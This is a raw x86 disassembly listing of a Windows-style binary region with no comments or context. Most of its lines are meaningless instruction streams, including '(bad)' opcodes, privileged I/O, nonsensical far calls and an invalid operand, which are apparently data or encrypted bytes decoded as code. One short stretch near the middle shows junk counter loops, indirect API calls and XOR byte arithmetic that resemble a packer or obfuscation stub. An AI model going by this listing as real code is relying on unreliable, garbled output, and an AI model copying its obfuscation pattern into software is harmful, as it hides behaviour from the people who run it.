  406a00:	fnstcw WORD PTR [ecx+0x28]
  406a03:	ins    BYTE PTR es:[edi],dx
  406a04:	pop    ss
  406a05:	add    al,0x6a
  406a07:	fprem1 
  406a09:	std    
  406a0a:	jle    0x406a1c
  406a0c:	div    BYTE PTR [esi+0x6d]
  406a0f:	push   ss
  406a10:	sbb    edi,esp
  406a12:	sbb    al,0x54
  406a14:	and    ebp,DWORD PTR ds:0x4f880233
  406a1a:	adc    al,BYTE PTR [eax]
  406a1c:	add    bh,BYTE PTR ds:0x989cbbe
  406a22:	clc    
  406a23:	test   DWORD PTR [esi+ebx*1+0xa],esi
  406a27:	sub    esi,ecx
  406a29:	stc    
  406a2a:	ret    
  406a2b:	ins    BYTE PTR es:[edi],dx
  406a2c:	ret    0x5e63
  406a2f:	push   eax
  406a30:	ins    DWORD PTR es:[edi],dx
  406a31:	pop    ds
  406a32:	(bad)  
  406a33:	adc    al,BYTE PTR [edi-0x6109fe8c]
  406a39:	test   eax,0xc660a05c
  406a3e:	mov    eax,0xf0031c87
  406a43:	or     eax,0xc83c50c0
  406a48:	(bad)  
  406a49:	in     eax,0x78
  406a4b:	repnz add esi,DWORD PTR [edx+0x525ae0fe]
  406a52:	inc    ebp
  406a53:	adc    eax,0x8fbe03
  406a58:	xor    al,0xbe
  406a5a:	and    edx,DWORD PTR [eax+0x4f6ae979]
  406a60:	test   eax,0x7bc7013c
  406a65:	jge    0x406a4a
  406a67:	dec    ebp
  406a68:	sbb    edi,DWORD PTR [ecx-0x7bf38d59]
  406a6e:	nop
  406a6f:	and    al,cl
  406a71:	cwde   
  406a72:	cmp    ah,dh
  406a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a75:	ds ret 
  406a77:	push   esp
  406a78:	adc    dh,BYTE PTR [esi]
  406a7a:	dec    ebx
  406a7b:	push   0xffffffcb
  406a7d:	xchg   ecx,eax
  406a7e:	call   0xaa91:0x80620069
  406a85:	out    0x7f,al
  406a87:	inc    esp
  406a88:	sub    dl,bh
  406a8a:	push   0x674ef08c
  406a8f:	test   DWORD PTR [ebp+0x5db7b069],0x7be7774
  406a99:	out    0x95,eax
  406a9b:	and    edx,DWORD PTR [esi]
  406a9d:	xchg   edi,eax
  406a9e:	enter  0x88fc,0xaf
  406aa2:	jo     0x406a24
  406aa4:	lea    ecx,[ebp-0x17091c41]
  406aaa:	fadd   DWORD PTR [ecx+0x5e]
  406aad:	xchg   esp,eax
  406aae:	test   BYTE PTR [ebx+0x49],ah
  406ab1:	sbb    al,0x25
  406ab3:	jmp    0x406b13
  406ab5:	push   0x8dea9199
  406aba:	call   0xcbee31ee
  406abf:	add    al,0xa8
  406ac1:	inc    edx
  406ac2:	fistp  DWORD PTR [edi]
  406ac4:	or     cl,BYTE PTR [esi*8+0x2a953143]
  406acb:	mov    al,0xbe
  406acd:	or     eax,0x9bb6650e
  406ad2:	ss hlt 
  406ad4:	xchg   BYTE PTR [edx],bh
  406ad6:	or     cl,al
  406ad8:	into   
  406ad9:	iret   
  406ada:	xor    al,0x2f
  406adc:	ror    DWORD PTR [edx+0x5e662c6b],cl
  406ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ae3:	and    BYTE PTR [ecx+0x3d],0x87
  406ae7:	hlt    
  406ae8:	mov    ecx,0x4d7453f9
  406aed:	sbb    eax,0x77c1904a
  406af2:	mov    bl,0xcf
  406af4:	jnp    0x406aba
  406af6:	out    dx,al
  406af7:	pop    eax
  406af8:	bound  esi,QWORD PTR gs:[esi+0x19]
  406afc:	pop    ebp
  406afd:	dec    esi
  406afe:	sbb    cl,BYTE PTR [esi+0x7e]
  406b01:	aad    0x45
  406b03:	pop    ds
  406b04:	bound  ecx,QWORD PTR ds:0xb11f0365
  406b0a:	mov    edi,0x67851b4f
  406b0f:	or     al,BYTE PTR [ecx+0x3d]
  406b12:	inc    ecx
  406b13:	push   0xf81c5588
  406b18:	sub    bh,ch
  406b1a:	call   0x81eb:0x494156d0
  406b21:	pop    edi
  406b22:	ins    BYTE PTR es:[edi],dx
  406b23:	lds    ecx,FWORD PTR [eax+0x4df5dc96]
  406b29:	cmc    
  406b2a:	aam    0x94
  406b2c:	mov    ecx,DWORD PTR [edi-0x7b]
  406b2f:	lods   al,BYTE PTR ds:[esi]
  406b30:	out    dx,eax
  406b31:	inc    ebx
  406b32:	je     0x406b0c
  406b34:	dec    edi
  406b35:	push   edi
  406b36:	repz shl BYTE PTR [edx+0x201e53df],0xd3
  406b3e:	or     al,0x29
  406b40:	std    
  406b41:	push   edi
  406b42:	adc    ecx,ebp
  406b44:	add    al,0x71
  406b46:	dec    ecx
  406b47:	fsubp  st(6),st
  406b49:	or     al,0x51
  406b4b:	clc    
  406b4c:	gs push esi
  406b4e:	fidiv  DWORD PTR [ecx+0x6d]
  406b51:	xor    BYTE PTR [ecx-0x662a1e17],0xf
  406b58:	fldenv [ecx+edi*2+0x17f59df]
  406b5f:	pop    edx
  406b60:	mov    bh,0xc5
  406b62:	cwde   
  406b63:	aam    0xf2
  406b65:	repnz mov esp,0x5ae8c801
  406b6b:	jp     0x406b47
  406b6d:	pop    esi
  406b6e:	sahf   
  406b6f:	das    
  406b70:	shr    DWORD PTR [edx],cl
  406b72:	and    BYTE PTR [ecx-0x52],0x44
  406b76:	je     0x406b62
  406b78:	mov    al,0x99
  406b7a:	call   FWORD PTR [edx]
  406b7c:	and    al,0x8a
  406b7e:	or     DWORD PTR [ebx-0x44],ebx
  406b81:	lea    eax,ds:0xceb82245
  406b87:	rcl    bh,0x6b
  406b8a:	dec    esp
  406b8b:	or     eax,DWORD PTR [esi]
  406b8d:	sbb    al,0x60
  406b8f:	scas   al,BYTE PTR es:[edi]
  406b90:	inc    eax
  406b91:	add    ch,ch
  406b93:	ret    0xf766
  406b96:	std    
  406b97:	ds daa 
  406b99:	lods   al,BYTE PTR ds:[esi]
  406b9a:	or     al,BYTE PTR [ecx+ebx*2-0x73cf724a]
  406ba1:	sbb    eax,0x9844a746
  406ba6:	shl    DWORD PTR [edi-0x67a6842b],cl
  406bac:	xor    edx,esi
  406bae:	push   esi
  406baf:	push   0xda622a49
  406bb4:	std    
  406bb5:	sar    eax,0xb
  406bb8:	outs   dx,BYTE PTR ds:[esi]
  406bb9:	add    al,0xb5
  406bbb:	mov    al,ds:0xe62edd0a
  406bc0:	in     eax,dx
  406bc1:	xchg   DWORD PTR [eax+0x71],ecx
  406bc4:	lods   al,BYTE PTR ds:[esi]
  406bc5:	loope  0x406bb8
  406bc7:	or     al,0x27
  406bc9:	neg    BYTE PTR [eax-0x38e06541]
  406bcf:	repnz (bad) 
  406bd1:	repz repz les edx,FWORD PTR [edx]
  406bd5:	add    BYTE PTR [ecx],ch
  406bd7:	xor    al,0xeb
  406bd9:	inc    ebp
  406bda:	adc    ebx,DWORD PTR [esi]
  406bdc:	daa    
  406bdd:	xor    ebx,DWORD PTR [edx-0x45334dca]
  406be3:	mov    ?,WORD PTR ss:[edx]
  406be6:	cdq    
  406be7:	mov    ds:0x91305a45,eax
  406bec:	stos   BYTE PTR es:[edi],al
  406bed:	loope  0x406b88
  406bef:	sar    eax,cl
  406bf1:	pop    ds
  406bf2:	push   ecx
  406bf3:	jg     0x406c09
  406bf5:	das    
  406bf6:	push   0x3e
  406bf8:	dec    ecx
  406bf9:	pop    ds
  406bfa:	je     0x406c38
  406bfc:	icebp  
  406bfd:	adc    al,0x1c
  406bff:	mov    bl,0x49
  406c01:	je     0x406b91
  406c03:	sub    al,0x19
  406c05:	mov    esi,DWORD PTR [eax+0x72]
  406c08:	pusha  
  406c09:	cmp    eax,0x24a35127
  406c0e:	and    al,BYTE PTR [ecx+0x0]
  406c11:	mov    eax,DWORD PTR [ebp+0xc]
  406c14:	xor    eax,ecx
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	stos   BYTE PTR es:[edi],al
  406c28:	push   ds
  406c29:	mov    al,BYTE PTR [edi]
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	aaa    
  406c34:	push   es
  406c35:	ds das 
  406c37:	mov    ch,0xfc
  406c39:	(bad)  
  406c3a:	bound  ecx,QWORD PTR ds:0x466f9ea3
  406c40:	push   esi
  406c41:	aaa    
  406c42:	mov    eax,ds:0x30e9d7e7
  406c47:	sti    
  406c48:	mov    edx,0x9377ec5f
  406c4d:	mov    dh,0x3b
  406c4f:	jb     0x406bde
  406c51:	cli    
  406c52:	jmp    0x406c00
  406c54:	shl    edx,1
  406c56:	call   0x34c2f585
  406c5b:	idiv   DWORD PTR [edx+0x28826128]
  406c61:	mov    ecx,0x70c8e822
  406c66:	inc    eax
  406c67:	arpl   WORD PTR [edi],sp
  406c69:	stos   BYTE PTR es:[edi],al
  406c6a:	mov    DWORD PTR ds:0xc420c7e4,edx
  406c70:	daa    
  406c71:	xchg   edx,eax
  406c72:	xchg   ebp,eax
  406c73:	add    eax,0x62e3dfd2
  406c78:	sbb    ah,BYTE PTR [edi+0x13]
  406c7b:	dec    esp
  406c7c:	xchg   ebx,eax
  406c7d:	loop   0x406c61
  406c7f:	sbb    ebp,DWORD PTR [eax+0x3a]
  406c82:	pop    edi
  406c83:	cmp    bh,BYTE PTR [ebx-0x63d23a5d]
  406c89:	adc    al,0xd6
  406c8b:	imul   eax,DWORD PTR [ebx+0x1a],0x545a5ffd
  406c92:	mov    WORD PTR [edi],ds
  406c94:	js     0x406c59
  406c96:	and    DWORD PTR [eax-0x7b309cf1],edx
  406c9c:	daa    
  406c9d:	dec    eax
  406c9e:	pshufw mm1,QWORD PTR [esi-0x35],0x6d
  406ca3:	push   ebp
  406ca4:	mov    ch,0xb7
  406ca6:	push   0xa9252e46
  406cab:	adc    edx,ecx
  406cad:	imul   eax,DWORD PTR [edx-0x18bb70e0],0x7a061504
  406cb7:	out    0x84,al
  406cb9:	out    0xec,al
  406cbb:	inc    edx
  406cbc:	cmp    DWORD PTR [esi+0x64],esp
  406cbf:	and    ebp,DWORD PTR [ebx-0x12]
  406cc2:	fisubr WORD PTR [eax]
  406cc4:	aas    
  406cc5:	pushf  
  406cc6:	icebp  
  406cc7:	sbb    eax,0x41d5f931
  406ccc:	ror    cl,cl
  406cce:	cs in  al,dx
  406cd0:	(bad)  
  406cd1:	call   0x5b35:0xe1eff1d3
  406cd8:	xor    al,0x86
  406cda:	sub    ebx,DWORD PTR [ebp-0x37]
  406cdd:	pop    edi
  406cde:	dec    eax
  406cdf:	adc    al,0xab
  406ce1:	pop    ecx
  406ce2:	mov    BYTE PTR [edi+0x5800be21],bh
  406ce8:	mov    ah,0x57
  406cea:	mov    eax,ds:0x3d18d771
  406cef:	and    dl,BYTE PTR [ecx+0x17]
  406cf2:	mov    dh,0x9b
  406cf4:	push   ebp
  406cf5:	lds    esi,FWORD PTR [edi-0x68]
  406cf8:	fstp   st(1)
  406cfa:	inc    eax
  406cfb:	mov    al,ds:0x922959a2
  406d00:	sbb    esi,DWORD PTR [eax]
  406d02:	lods   eax,DWORD PTR ds:[esi]
  406d03:	push   0xffffffee
  406d05:	cmp    eax,edx
  406d07:	push   ds
  406d08:	fadd   DWORD PTR [esi-0x6]
  406d0b:	mov    al,ds:0xa8ba35f2
  406d10:	xchg   ebx,eax
  406d11:	stos   BYTE PTR es:[edi],al
  406d12:	das    
  406d13:	push   esi
  406d14:	cld    
  406d15:	or     eax,0x356804fd
  406d1a:	shl    DWORD PTR [ebp-0x29],0x27
  406d1e:	es push ds
  406d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d21:	fisttp DWORD PTR [eax-0x78ddb31d]
  406d27:	pop    ss
  406d28:	jae    0x406d75
  406d2a:	or     ch,BYTE PTR [edi-0x601ab4f9]
  406d30:	push   ecx
  406d31:	icebp  
  406d32:	push   edi
  406d33:	push   edx
  406d34:	outs   dx,DWORD PTR ds:[esi]
  406d35:	int3   
  406d36:	mov    bh,0xb2
  406d38:	test   al,0x5e
  406d3a:	stc    
  406d3b:	daa    
  406d3c:	xor    ebx,esi
  406d3e:	push   eax
  406d3f:	and    eax,0x9e2f7d11
  406d44:	sbb    ebp,DWORD PTR [ebx+ebp*2-0x7e]
  406d48:	stc    
  406d49:	push   esp
  406d4a:	shr    BYTE PTR [edi],0x22
  406d4d:	ds or  al,0xa
  406d50:	mov    ebp,DWORD PTR ds:[edi-0x26024285]
  406d57:	cmp    DWORD PTR [eax+0x38],esp
  406d5a:	into   
  406d5b:	jo     0x406dc2
  406d5d:	fdiv   st(1),st
  406d5f:	ins    BYTE PTR es:[edi],dx
  406d60:	jmp    0x406cec
  406d62:	shl    BYTE PTR [ebp-0x598f88b3],1
  406d68:	in     al,0x99
  406d6a:	loopne 0x406d7d
  406d6c:	addr16 jno 0x406d96
  406d6f:	(bad)  
  406d70:	ins    BYTE PTR es:[edi],dx
  406d71:	push   esp
  406d72:	scas   al,BYTE PTR es:[edi]
  406d73:	dec    esp
  406d74:	jecxz  0x406d8a
  406d76:	dec    esp
  406d77:	sbb    eax,0x2af092d4
  406d7c:	mul    BYTE PTR [eax+0x52]
  406d7f:	mov    eax,ds:0xc61fae87
  406d84:	push   esp
  406d85:	iret   
  406d86:	mov    dh,BYTE PTR [eax-0x4c]
  406d89:	repz xor al,cl
  406d8c:	(bad)  
  406d8d:	out    0x9a,eax
  406d8f:	jnp    0x406d4f
  406d91:	out    dx,al
  406d92:	enter  0x727b,0x3a
  406d96:	ss inc ecx
  406d98:	jns    0x406ddb
  406d9a:	dec    eax
  406d9b:	cmp    al,0x2b
  406d9d:	xor    edx,ebp
  406d9f:	push   cs
  406da0:	jne    0x406dc2
  406da2:	mov    ecx,DWORD PTR [ebp+0x5dd2050d]
  406da8:	clc    
  406da9:	retf   
  406daa:	es sahf 
  406dac:	jge    0x406da2
  406dae:	js     0x406dcd
  406db0:	jnp    0x406e2a
  406db2:	loope  0x406d92
  406db4:	div    bh
  406db6:	in     eax,dx
  406db7:	popa   
  406db8:	into   
  406db9:	hlt    
  406dba:	xchg   esi,eax
  406dbb:	jbe    0x406d90
  406dbd:	fcmovnu st,st(1)
  406dbf:	pop    ss
  406dc0:	sub    BYTE PTR [edx+0x70ec5b17],bl
  406dc6:	int    0x77
  406dc8:	(bad)  
  406dc9:	adc    eax,0xe2b35037
  406dce:	xor    BYTE PTR [edi],dl
  406dd0:	dec    esi
  406dd1:	cmp    DWORD PTR [eax],ebx
  406dd3:	(bad)  
  406dd4:	jae    0x406de0
  406dd6:	or     ebx,DWORD PTR [ebx]
  406dd8:	fisubr DWORD PTR [ebx+edi*4]
  406ddb:	mov    edi,0xcf8b7c61
  406de0:	data16 aas 
  406de2:	sub    ecx,esi
  406de4:	push   0xc29611c5
  406de9:	or     BYTE PTR [edi+0x7d36691e],ah
  406def:	into   
  406df0:	inc    edx
  406df1:	mov    al,ds:0xd56e1174
  406df6:	loop   0x406e0f
  406df8:	inc    ebx
  406df9:	retf   0x3def
  406dfc:	fld    st(4)
  406dfe:	aam    0x62
  406e00:	imul   dh
  406e02:	(bad)  
  406e03:	lods   eax,DWORD PTR ds:[esi]
  406e04:	inc    esi
  406e05:	pusha  
  406e06:	jle    0x406dc5
  406e08:	sbb    al,0xc8
  406e0a:	and    DWORD PTR [ebx],eax
  406e0c:	xchg   edi,eax
  406e0d:	dec    esi
  406e0e:	mov    dh,0x71
  406e10:	int    0x81
  406e12:	add    eax,0x3db9de
  406e17:	and    al,0x9e
  406e19:	sbb    al,BYTE PTR [eax+0x7932f12e]
  406e1f:	pop    ebx
  406e20:	xchg   edx,eax
  406e21:	and    esp,edi
  406e23:	sbb    esi,DWORD PTR ds:0x51200120
  406e29:	popw   es
  406e2b:	test   al,0x74
  406e2d:	fsub   QWORD PTR [edx]
  406e2f:	loope  0x406db7
  406e31:	out    0x4f,al
  406e33:	mov    bh,0x78
  406e35:	add    al,0x36
  406e37:	mov    BYTE PTR [ecx-0x6],cl
  406e3a:	cld    
  406e3b:	or     eax,0x20bdc48
  406e40:	xor    ah,BYTE PTR fs:[ecx+0x4b76b7d5]
  406e47:	mov    ecx,0x21b46988
  406e4c:	sahf   
  406e4d:	push   0xffffffb9
  406e4f:	push   ds
  406e50:	push   cs
  406e51:	adc    cl,dh
  406e53:	iret   
  406e54:	(bad)  [ebp-0x36923d21]
  406e5a:	push   edi
  406e5b:	mov    edi,0x3aa8fef4
  406e60:	popa   
  406e61:	shl    BYTE PTR [ebp-0x73e13dd0],0x85
  406e68:	rol    ah,1
  406e6a:	cmp    eax,0x5d94bcff
  406e6f:	jae    0x406ec9
  406e71:	inc    esp
  406e72:	sub    esi,eax
  406e74:	cmp    eax,0x7c683e05
  406e79:	mov    eax,0xe6c0675f
  406e7e:	lock test al,0x17
  406e81:	and    bh,ch
  406e83:	jno    0x406ec0
  406e85:	daa    
  406e86:	in     al,0x92
  406e88:	rcr    DWORD PTR [eax+0x78de20af],cl
  406e8e:	pop    ebp
  406e8f:	dec    esi
  406e90:	out    dx,al
  406e91:	pop    edx
  406e92:	add    eax,0x67116979
  406e97:	pop    ebp
  406e98:	stos   DWORD PTR es:[edi],eax
  406e99:	call   0xceaf89bc
  406e9e:	jecxz  0x406e5b
  406ea0:	xchg   edx,eax
  406ea1:	mov    ecx,0x1c184ca2
  406ea6:	arpl   WORD PTR ds:0x7670016a,si
  406eac:	sbb    BYTE PTR ds:0x353b623b,bh
  406eb2:	and    DWORD PTR [eax+0x380f0b52],ebp
  406eb8:	sub    DWORD PTR [edi+0x5d12b0b1],0x321f032a
  406ec2:	push   edi
  406ec3:	out    0xcb,al
  406ec5:	imul   edi,DWORD PTR [edx-0x2],0x2118831a
  406ecc:	adc    eax,0x340a9a6a
  406ed1:	mov    eax,ds:0x47c410eb
  406ed6:	pop    ds
  406ed7:	xor    esi,DWORD PTR [ebx]
  406ed9:	mov    edx,0x56cc359b
  406ede:	or     al,0x8a
  406ee0:	cmp    ebp,DWORD PTR [edx+0xdbfce50]
  406ee6:	das    
  406ee7:	clc    
  406ee8:	mov    dh,0x94
  406eea:	xchg   esi,eax
  406eeb:	xor    DWORD PTR [eax],edx
  406eed:	xor    eax,0x7b058052
  406ef2:	into   
  406ef3:	inc    BYTE PTR [ebx+0x3e]
  406ef6:	fwait
  406ef7:	test   eax,0x44d60b30
  406efc:	pop    ss
  406efd:	test   eax,0x168d2bea
  406f03:	pop    es
  406f04:	cli    
  406f05:	pop    edi
  406f06:	and    DWORD PTR [ebx+edx*4+0x60eb7402],0x62
  406f0e:	(bad)  
  406f0f:	xchg   ecx,eax
  406f10:	add    bh,BYTE PTR cs:[edx-0x22d01a67]
  406f17:	sbb    DWORD PTR [eax-0x17],edi
  406f1a:	iret   
  406f1b:	ficom  DWORD PTR [edi+eiz*8]
  406f1e:	inc    esi
  406f1f:	cld    
  406f20:	(bad)  
  406f21:	bswap  edi
  406f23:	call   0xcffc:0x40be7db2
  406f2a:	mov    dl,0x61
  406f2c:	add    BYTE PTR [eax-0x7bc8f532],al
  406f32:	call   0x7f116380
  406f37:	inc    ecx
  406f38:	pop    esp
  406f39:	inc    ebx
  406f3a:	ffree  st(0)
  406f3c:	inc    edx
  406f3d:	ror    BYTE PTR [ebx-0x2],1
  406f40:	(bad)  
  406f41:	in     eax,dx
  406f42:	add    cl,BYTE PTR [edi+eax*2+0x2514807b]
  406f49:	in     eax,dx
  406f4a:	scas   al,BYTE PTR es:[edi]
  406f4b:	inc    eax
  406f4c:	mov    dh,0xea
  406f4e:	adc    DWORD PTR [esi-0x56e497c0],edx
  406f54:	inc    eax
  406f55:	xlat   BYTE PTR ds:[ebx]
  406f56:	mov    bl,dh
  406f58:	push   es
  406f59:	dec    esi
  406f5a:	adc    BYTE PTR [ebx+0x6fa07742],0x6b
  406f61:	xchg   ebx,eax
  406f62:	xchg   DWORD PTR [esi-0x26],esp
  406f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f66:	cli    
  406f67:	and    eax,0xbbcf3439
  406f6c:	jnp    0x406f15
  406f6e:	addr16 cmc 
  406f70:	loopne 0x406fb2
  406f72:	(bad)  
  406f73:	jecxz  0x406f0a
  406f75:	fdiv   st(7),st
  406f77:	sub    eax,DWORD PTR [ebx+0x47c26a9a]
  406f7d:	mov    esp,es
  406f7f:	hlt    
  406f80:	mov    dh,0x86
  406f82:	pop    esp
  406f83:	xchg   esp,eax
  406f84:	mov    esi,0x37d7d66d
  406f89:	xor    ebx,DWORD PTR [edx]
  406f8b:	outs   dx,BYTE PTR ds:[esi]
  406f8c:	pop    ebx
  406f8d:	mov    BYTE PTR [eax+0xe],cl
  406f90:	fsub   QWORD PTR [esi+0x55]
  406f93:	adc    al,0xb5
  406f95:	add    BYTE PTR [edi],ch
  406f97:	js     0x407012
  406f99:	xor    DWORD PTR [edx+0x40e38966],ecx
  406f9f:	dec    esp
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430616,0x19
  406fd8:	cmp    DWORD PTR ds:0x430616,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430616,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ec44
  406ffd:	cmp    DWORD PTR ds:0x430616,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430616
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430616,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430616
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430616,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x4306d6,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x4306ca,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef98,0x42efa0
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef90,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef9c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef9c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef9c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef9c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42ed24
  4070a9:	cmp    DWORD PTR ds:0x42ef9c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef9c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef9c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef9c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x4306da,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42efa8,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42efa8
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42efa8,ecx
  4070fe:	cmp    DWORD PTR ds:0x42efa8,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42efa8,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42efa4
  407123:	call   DWORD PTR ds:0x42ed28
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x43063a
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430612,0x17
  407147:	cmp    DWORD PTR ds:0x430612,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430612,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb84
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430612
  407179:	dec    eax
  40717a:	mov    ds:0x430612,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0x5669c8c1
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407136
  4071b2:	jne    0x4071eb
  4071b4:	rcr    DWORD PTR [edi+0x23e0a48f],0x17
  4071bb:	sbb    eax,0x38cfbe09
  4071c0:	push   0x6f511c34
  4071c5:	icebp  
  4071c6:	(bad)  
  4071c7:	fisubr WORD PTR [edx]
  4071c9:	rcr    DWORD PTR [edx+0x0],cl
  4071cc:	cli    
  4071cd:	mov    edi,0x2a3fc36
  4071d2:	cmp    eax,0xd2b6d83b
  4071d7:	bound  eax,QWORD PTR [ecx-0xe]
  4071da:	cmp    al,0x90
  4071dd:	mov    bh,0xf3
  4071df:	dec    esp
  4071e0:	dec    ebp
  4071e1:	mov    bh,0x4a
  4071e3:	scas   al,BYTE PTR es:[edi]
  4071e4:	sbb    al,0x64
  4071e6:	stos   DWORD PTR es:[edi],eax
  4071e7:	jnp    0x40719a
  4071e9:	push   esi
  4071ea:	fdiv   st(5),st
  4071ec:	aad    0x70
  4071ee:	fisttp QWORD PTR [esp+edi*4]
  4071f1:	pop    esp
  4071f2:	test   DWORD PTR [edx-0xf52cc4f],esp
  4071f8:	mov    eax,ds:0x9997e8dd
  4071fd:	retf   
  4071fe:	adc    DWORD PTR [ebx+0xc],edi
  407201:	cmp    eax,0x1020bd18
  407206:	mov    bl,0x49
  407208:	sub    eax,0xe3a9ccbb
  40720d:	inc    eax
  40720e:	mov    bh,0xc8
  407210:	dec    edi
  407211:	loope  0x407228
  407213:	push   edi
  407214:	cmc    
  407215:	in     al,dx
  407216:	jo     0x4071de
  407218:	adc    bl,ah
  40721a:	shl    dl,1
  40721c:	daa    
  40721d:	pop    esi
  40721e:	dec    ecx
  40721f:	std    
  407220:	mov    al,0xcb
  407222:	shr    ch,cl
  407224:	repnz aas 
  407226:	jnp    0x407223
  407228:	clc    
  407229:	in     eax,dx
  40722a:	adc    BYTE PTR [edi],bh
  40722c:	les    esi,FWORD PTR fs:[eax+ebp*4+0x6d]
  407231:	inc    edx
  407232:	mov    dl,0xf1
  407234:	cs add esp,edx
  407237:	in     eax,0x39
  407239:	in     eax,dx
  40723a:	in     al,dx
  40723b:	mov    edi,0x71a5b376
  407240:	jns    0x4071f3
  407242:	in     al,0x6d
  407244:	pushf  
  407245:	ficomp DWORD PTR [edi]
  407247:	push   eax
  407248:	sub    edx,ecx
  40724a:	push   ds
  40724b:	pop    edx
  40724c:	xchg   edi,eax
  40724d:	jp     0x4072ae
  40724f:	ret    0xf8d4
  407252:	add    eax,0xb4cd1171
  407257:	adc    dh,BYTE PTR [edx]
  407259:	cmp    bh,BYTE PTR [ebx]
  40725b:	inc    eax
  40725c:	aaa    
  40725d:	push   0x594d9b8f
  407262:	int    0x82
  407264:	mov    BYTE PTR [ecx],dl
  407266:	in     eax,0xe9
  407268:	loop   0x407261
  40726a:	mov    BYTE PTR [edi],dl
  40726c:	repz push ds
  40726e:	pop    eax
  40726f:	sub    al,0xd1
  407271:	push   cs
  407272:	retf   
  407273:	dec    ebx
  407274:	sbb    eax,0xc7268608
  407279:	fstp   QWORD PTR [esi-0x7e9e2763]
  40727f:	or     al,0xfa
  407281:	repnz push esi
  407283:	pop    esi
  407284:	stos   DWORD PTR es:[edi],eax
  407285:	cmp    al,BYTE PTR ss:[eax+0x74]
  407289:	cmp    ch,BYTE PTR [ebx]
  40728b:	and    dl,al
  40728d:	shr    BYTE PTR [eax-0x7f6db73c],1
  407293:	and    bh,BYTE PTR [ecx+0x268cea9f]
  407299:	jbe    0x407313
  40729b:	or     BYTE PTR [edi+eiz*1],dh
  40729e:	push   edi
  40729f:	and    esp,ebx
  4072a1:	loopne 0x407291
  4072a3:	inc    edi
  4072a4:	pop    ds
